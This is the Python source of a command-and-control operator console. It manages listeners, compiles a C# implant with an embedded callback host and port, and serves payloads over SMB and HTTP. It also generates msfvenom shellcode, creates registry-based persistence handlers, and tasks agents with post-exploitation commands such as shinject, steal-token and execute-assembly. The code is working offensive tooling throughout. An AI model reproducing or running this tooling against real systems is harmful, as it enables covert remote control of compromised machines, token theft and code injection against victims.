import requests
import sqlite3
import subprocess
import shutil
import pyperclip
import itertools
import os 
import time
import re
import base64
import tmuxp
import datetime
import sys
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory, InMemoryHistory
from prompt_toolkit.shortcuts import ProgressBar
from prompt_toolkit import prompt
from prompt_toolkit import print_formatted_text as print
from prompt_toolkit.completion import Completer, Completion, WordCompleter
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory, AutoSuggest, Suggestion
from prompt_toolkit.styles import Style
from prompt_toolkit.formatted_text import HTML
from impacket import smbserver
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
import threading
from tabulate import tabulate
from imports.encoder import Encoder
from imports.logging_cfg import log
from imports.shellcode_gen import MsfVenomShellcode


base_url = f'http://localhost:5000'

class HistoryAutoSuggest(AutoSuggestFromHistory):
    def __init__(self, history):
        self.history = history

    def get_suggestion(self, buffer, document):
        text = document.text_before_cursor.lstrip()
        suggestions = self.history.get_strings()  # Get all history entries
        for suggestion in suggestions[::-1]:  # Iterate in reverse order to get most recent suggestions first
            if suggestion.startswith(text):
                return Suggestion(suggestion[len(text):])
        return None
    
class AgentCompleter(Completer):
    def get_agent_ids(self):
        with sqlite3.connect('agents.db') as conn:
            c = conn.cursor()
            c.execute("SELECT agent_id FROM agents")
            rows = c.fetchall()
        return [row[0] for row in rows]

    def get_completions(self, document, complete_event):
        word_before_cursor = document.get_word_before_cursor()
        agent_ids = self.get_agent_ids()
        for agent_id in agent_ids:
            if agent_id.startswith(word_before_cursor):
                yield Completion(agent_id, start_position=-len(word_before_cursor))
                

class ShellCodeCompleter(Completer):
    def __init__(self):
        file_path = '.msfvenom_payloads.txt'
        with open(file_path, 'r') as file:
            self.msfvenom_payloads = file.read().splitlines()

    def get_completions(self, document, complete_event):
        word_before_cursor = document.get_word_before_cursor()
        text = document.text_before_cursor.lstrip()

        for suggestion in self.msfvenom_payloads:
            if suggestion.startswith(word_before_cursor):
                yield Completion(suggestion, start_position=-len(word_before_cursor))
                
class TaskCompleter(Completer):
    def __init__(self, task_ids, aliases, timestamps):
        self.task_ids = task_ids
        self.aliases = aliases
        self.timestamps = timestamps

    def get_completions(self, document, complete_event):
        word_before_cursor = document.get_word_before_cursor()
        for task_id in self.task_ids:
            if task_id.startswith(word_before_cursor):
                alias = self.aliases.get(task_id, task_id)
                timestamp = self.timestamps.get(task_id, "")
                display_text = f"{alias} - [{task_id}] - {timestamp}"
                yield Completion(task_id, start_position=-len(word_before_cursor), display=display_text)

# def print_help():
# ####ToDo print help as tmux popupwindow, create doc for each mode and allow user to select mode with fzf
#     """
#     Print help information for each mode and available payload types.
#     """
#     print("Available modes:")
#     print("  - serve")
#     print("  - listener")
#     print("  - generate")
#     print("For mode-specific help, use 'help <mode>'.")
#     print()

#     print("serve mode:")
#     print("  - serve --port <port>  Start an HTTP server to serve files.")
#     print()

#     print("listener mode:")
#     print("  - listener --port <port>  Start the listener.")
#     print()

#     print("generate mode:")
#     print("  - generate --payload_type <type> --host <host> --port <port> [--output_file <file>]")
#     print("    Generate a payload based on the given parameters.")
#     print("    Supported payload types:")
#     print("    - reverse: Reverse shell payload")
#     print("    - bind: Bind shell payload")
#     print("    - antiAV: Anti-Antivirus payload")
#     print()


class APIWrapper:
    def __init__(self):
        self.style = Style.from_dict({
            'prompt_text': 'ansicyan bold',
            'prompt': 'ansiblue',
        })
        
        self.conn = sqlite3.connect('agents.db', check_same_thread=False)
        self.c = self.conn.cursor()
    
    def handle_response(self, response):
        try:
            response.raise_for_status()
            return response.json()
        except requests.exceptions.HTTPError as err:
            log.error(f"Failed to send task to the agent - command parameters may be incorrect")
        except requests.exceptions.RequestException as err:
            log.error(f"Request Exception: {err}")
        except ValueError:
            log.error("Error: Invalid response.")
        return None


    def interact_with_listeners(self):
        while True:
            try:
                action = prompt('Listeners> ', completer=self.listeners_completer)

                if action == '':
                    continue
                                
                elif action == 'display_listeners':
                    response = requests.get(f"{base_url}/listeners")
                    result = self.handle_response(response)
                    if result:
                        headers = ['Listener Name']
                        rows = [[listener['name']] for listener in result]
                        print(tabulate(rows, headers=headers, tablefmt='fancy_grid'))
                elif action == 'listener_info':
                    name = prompt('Listener name: ')
                    response = requests.get(f"{base_url}/listeners/{name}")
                    result = self.handle_response(response)
                    if result:
                        if isinstance(result, dict):
                            headers = result.keys()
                            rows = [list(result.values())]
                        else:
                            headers = result[0].keys() if result else []
                            rows = [list(item.values()) for item in result]
                        print(tabulate(rows, headers=headers, tablefmt='fancy_grid'))
                elif action == 'start_listener':
                    name = prompt('Listener name: ')
                    port = prompt('Bind port: ')
                    response = requests.post(f"{base_url}/listeners", json={'Name': name, 'BindPort': port})
                    result = self.handle_response(response)
                    if result:
                        log.success("Listener started successfully.")
                elif action == 'stop_listener':
                    name = prompt('Listener name: ')
                    response = requests.delete(f"{base_url}/listeners/{name}")
                    result = self.handle_response(response)
                    if result is None:
                        log.success("Listener stopped successfully.")
                
                elif action == 'main' or action == 'back':
                    return
                elif action == 'exit':
                    sys.exit(0)
                else:
                    log.warning('Invalid action.')
                    
            except KeyboardInterrupt:
                print()
                log.warning("Ctrl+c detected - returning to main menu")
                return
            
            except Exception:
                log.warning("Exiting...")
                sys.exit(0)
        
    def generate_shellcode(self):
        history = FileHistory('.msfvenom_payloads_history.txt')
        auto_suggest = HistoryAutoSuggest(history)
        while True:
            try:
                action = prompt('Shellcode> ', completer=self.shellcode_completer)
                
                if action == '':
                    continue
                elif action == 'generate':
                    if not self.msfvenom_command:
                        log.warning("Please use 'set_vars' first before generating.")
                        return
                    verbose = False
                    msfvenom = MsfVenomShellcode(self.msfvenom_command, verbose=verbose)
                    payload = msfvenom.generate_shellcode()
                    print("Encoded Shellcode:")
                    print("-" * 50)
                    print(payload)
                    print()
                    print("-" * 50)
                    
                    
                elif action == 'set_vars':
                    msf_payload = prompt("Enter msfvenom payload: [prefix + tab for options]: ", complete_while_typing=True, completer=ShellCodeCompleter(), auto_suggest=auto_suggest, history=history)
                    msf_lhost = prompt("Enter lhost: ")
                    msf_lport = prompt("Enter lport: ")
                    msf_user = prompt("Enter username: ")
                    msf_pass = prompt("Enter password: ")
                    
                    
                    self.msfvenom_command = msf_payload, msf_lhost, msf_lport, msf_user, msf_pass
                    log.success("Variables set - please run generate next.")
                    
                elif action == 'main' or action == 'back':
                    return
                    
                elif action == 'exit':
                    sys.exit(0)
                else:
                    print('Invalid action.')
            
            
            except AttributeError:
                log.warning("Please run 'set_vars' first before generating the shellcode.")
                continue
            
            except KeyboardInterrupt:
                print()
                log.warning("Ctrl+c detected - returning to main menu")
                return
                
            except Exception as e:
                log.error(f"An error occured during execution: {e}")
                
                sys.exit(0)


    def wait_for_task_completion(self, task, url):
        try:
            start_time = time.time()
            spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])

            while True:
                response = requests.get(url)
                status_code = response.status_code

                if status_code != 404:
                    result = response.json()
                    time.sleep(0.5)
                    break  # Exit the loop if the response code is not 404

                elapsed_time = time.time() - start_time  # Calculate elapsed time
                elapsed_time_str = time.strftime('%H:%M:%S', time.gmtime(elapsed_time))  # Format elapsed time as HH:MM:SS

                # Update the custom progress bar with status, timer, and spinning wheel
                print(HTML(f'<skyblue>Elapsed Time: {elapsed_time_str}</skyblue>  <violet>{next(spinner)}</violet>'), end='\r', flush=True)

                time.sleep(0.11)

        except requests.exceptions.RequestException as e:
            print(f"Failed waiting for task completion: {e}")
            return None

        return result


    def get_task_result(self, agent_id, task_id, command):
        with ProgressBar() as pb:
            url = (f"{base_url}/agents/{agent_id}/tasks/{task_id}")
            result = self.wait_for_task_completion(task_id, url)

        if result:
            if isinstance(result, list):
                headers = result[0].keys() if result else []
                rows = [list(item.values()) for item in result]
            elif isinstance(result, dict):
                headers = result.keys()
                rows = [list(result.values())]
            else:
                print("Invalid result format.")
                return

            log.success(f"Received result for command: {command}")
            print(tabulate(rows, headers=headers, tablefmt='fancy_grid'))

    def interact_with_agents(self):
        while True:
            try:
                action = prompt('Agents> ', completer=self.agents_completer)

                if action == '':
                    continue

                elif action == 'agent_info':
                    agent_id = prompt('Agent ID: ', completer=AgentCompleter(), complete_while_typing=True,
                                    auto_suggest=AutoSuggestFromHistory())
                    response = requests.get(f"{base_url}/agents/{agent_id}")
                    result = self.handle_response(response)
                    if result:
                        headers = result.keys()  # Use keys of the dictionary as headers
                        rows = [list(result.values())]  # Create a list of values as a single row
                        print(tabulate(rows, headers=headers, tablefmt='psql'))

                elif action == 'list_all_tasks':
                    agent_id = prompt('Agent ID: ', completer=AgentCompleter(), complete_while_typing=True,
                                    auto_suggest=AutoSuggestFromHistory())
                    response = requests.get(f"{base_url}/agents/{agent_id}/tasks")
                    result = self.handle_response(response)
                    
                    if result:
                        headers = result[0].keys() if result else []
                        rows = [list(item.values()) for item in result]
                        print(tabulate(rows, headers=headers, tablefmt='fancy_grid'))

                elif action == 'invoke_task':
                    agent_id, task_id, command = self.invoke_task()
                    self.get_task_result(agent_id, task_id, command)

                elif action == 'main' or action == 'back':
                    return
                    
                elif action == 'exit':
                    raise Exception
                else:
                    print('Invalid action.')
                    
            except KeyboardInterrupt:
                print()
                log.warning("Ctrl+c detected - returning to main menu")
                return
            
            except Exception as e:
                print(e)
                print("Exiting...")
                sys.exit(0)

    def invoke_task(self):
        available_commands = ['cd', 'mkdir', 'rmdir', 'execute-assembly', 'inject-handler', 'ls', 'ps', 'make-token', 'pwd', 'rev2self', 'run', 'shell', 'shinject', 'steal-token']
        agent_id = prompt('Agent ID: ', completer=AgentCompleter(), complete_while_typing=True, auto_suggest=AutoSuggestFromHistory())
        command_completer = WordCompleter(available_commands)
        command = prompt('Command: ', completer=command_completer, complete_while_typing=True, auto_suggest=AutoSuggestFromHistory()) 
        arguments = prompt('Arguments [direct command arguments]: ')
        file = prompt('File [encoded bytes]: ')

        arguments = arguments.split() if arguments else []
        
        if file == '' and arguments == '':
            json = {
                'Command': command,
                'Arguments': None,
                'File': None
            }
            
        
        elif file == '' and arguments:
            json = {
                'Command': command,
                'Arguments': arguments,
                'File': None
            }
            
        elif arguments == '' and file:
            with open(file, 'rb') as f:
                file_data = f.read()
            encoded_file_data = base64.b64encode(file_data).decode('utf-16le')

            json = {
                'Command': command,
                'Arguments': None,
                'File': encoded_file_data
            }
        
        else:
            json = {
                'Command': command, 
                'Arguments': arguments,
                'File': file
            }

        response = requests.post(f"{base_url}/agents/{agent_id}", json=json)
        log.info(f"Agent tasked to run: '{command}'")
        result = self.handle_response(response)

        if result:
            task_id = result['id']
            # Store the task_id in the database
            self.c.execute("INSERT INTO tasks (task_id, command, timestamp) VALUES (?, ?, ?)", (task_id, command, str(datetime.datetime.now())))
            self.conn.commit()
            return agent_id, task_id, command 
        else:
            log.error("Unable to connect to the agent")



    def compile_agent(self):
        placeholder_framework_path = "Framework/Agent/Program.cs"
        target_directory = "Framework/"
        original_directory = os.getcwd()
        
        try:
            host = prompt("Enter the callback host (APIServer): ")
            port = prompt("Enter the callback (listener) port: ")
            # Read the original content of Program.cs
            with open(placeholder_framework_path, 'r') as file:
                original_content = file.read()

            # Replace placeholders in the Framework with user-provided values
            with open(placeholder_framework_path, 'r') as file:
                framework_content = file.read()
                framework_content = framework_content.replace("<host>", host).replace("<port>", port)

            with open(placeholder_framework_path, 'w') as file:
                file.write(framework_content)

            if os.name != 'nt':
                # Change to the directory containing the Framework so that msbuild can work
                os.chdir(target_directory)
                log.info("Initated build instructions - please wait ...")
                # Run msbuild to build the project in the Release configuration
                subprocess.run(["msbuild", "/t:Rebuild", "/p:Configuration=Release"], stdout=open(".build_info.log", "w"))
                

                # Specify the output directory for the compiled agent executable
                output_directory = os.path.join(target_directory, "Agent/bin/Release/Agent.exe")
                
                # Change back to the original directory
                os.chdir(original_directory)

                # Restore the original content of Program.cs
                with open(placeholder_framework_path, 'w') as file:
                    file.write(original_content)
                
                destination_directory = os.path.join("www", "Agent.exe")
                shutil.move(output_directory, destination_directory)
                
                log.success(f"Agent built successfully and moved to {destination_directory}")
        except KeyboardInterrupt:
            return

        except Exception as e:
            log.error(f"An error occurred while attempting to build the agent: {e}")


    
    def interact_with_main_menu(self):
        while True:
            try:
                action = self.prompt_session.prompt('Main Menu> ', completer=self.main_menu_completer)
                if action == 'listeners':
                    self.interact_with_listeners()
                elif action == 'compile_agent':
                    log.info("Attempting to compile agent ...")
                    self.compile_agent()
                elif action == 'agents':
                    self.interact_with_agents()
                elif action == 'smbserver':
                    log.info("Attempting to host 'www' directory via SMB on port 445.")
                    self.start_smb_server()
                elif action == 'httpserver':
                    log.info("Attempting to host 'www' directory via HTTP on port 9000.")
                    self.start_http_server()
                elif action == "create_handler":
                    log.info("Entering payload creation mode.")
                    self.handler_generator()
                elif action == "generate_shellcode":
                    log.info("Entering shellcode creation mode.")
                    self.generate_shellcode()
                elif action == 'exit':
                    log.warning("Exiting...")
                    sys.exit(0)
                else:
                    print('Invalid action.')
                    
            except KeyboardInterrupt:
                print()
                log.warning("Ctrl+c detected - returning to main menu")
                pass
            
            except Exception as e:
                log.warning(f"An error occured during execution: {e}") # FIXME 
                log.warning("Returning to main menu...")

    def start_smb_server(self):
        class SimpleSMBHandler(smbserver.SimpleSMBServer):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, **kwargs)

            def on_connect(self, server):
                print(f"SMB server connected: {server.client_address}")

            def on_disconnect(self, server):
                print(f"SMB server disconnected: {server.client_address}")

        smb_thread = threading.Thread(target=self.run_smb_server, daemon=True)
        smb_thread.start()
        if smb_thread.is_alive():
            log.success("SMB server started")
        
    def run_smb_server(self):
        try:
            server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0", listenPort=445)
            server.addShare('www', 'www')
            server.setSMBChallenge('')
            server.setSMB2Support(True)
            server.setLogFile('.smb_logs.log')
            server.start()
        except Exception as e:
            print(f"An error occurred while running the SMB server: {e}")
            

    def start_http_server(self):
        class SilentHTTPHandler(SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory="www", **kwargs)

            def log_message(self, format, *args):
                pass  # Suppress logging of HTTP server messages

        # Redirect errors to /dev/null (Linux/macOS) or nul (Windows)
        devnull = os.devnull if os.name != 'nt' else 'nul'
        error_output = open(devnull, 'w')
        original_stderr = sys.stderr
        sys.stderr = error_output

        server_address = ('', 9000)
        httpd = TCPServer(server_address, SilentHTTPHandler)
        http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
        http_thread.start()
        log.success("HTTP server started on port: 9000")
        error_output.close()
        
    def handler_generator(self):
        history = FileHistory('.payload_history.txt')  # Specify the path to the history file
        auto_suggest = HistoryAutoSuggest(history)

        to_encode = prompt(
            "Enter command to execute once handler is activated [formats: powershell or program]: ",
            history=history
        )
        handler_name = prompt("Enter the name of the handler that will appear in the registry: ")
        Encoder(to_encode, handler_name)
        
        
    def main(self):
        self.main_menu_completer = WordCompleter(['compile_agent', 'generate_shellcode', 'listeners', 'agents', 'smbserver', 'create_handler', 'httpserver', 'exit'], ignore_case=True)
        self.listeners_completer = WordCompleter(['display_listeners', 'listener_info', 'start_listener', 'stop_listener', 'main', 'exit'], ignore_case=True)
        self.agents_completer = WordCompleter(['agent_info', 'list_all_tasks', 'invoke_task', 'main', 'exit'], ignore_case=True)
        self.shellcode_completer = WordCompleter(['generate', 'set_vars', 'main', 'exit'], ignore_case=True)
        self.prompt_session = PromptSession()
        self.interact_with_main_menu()



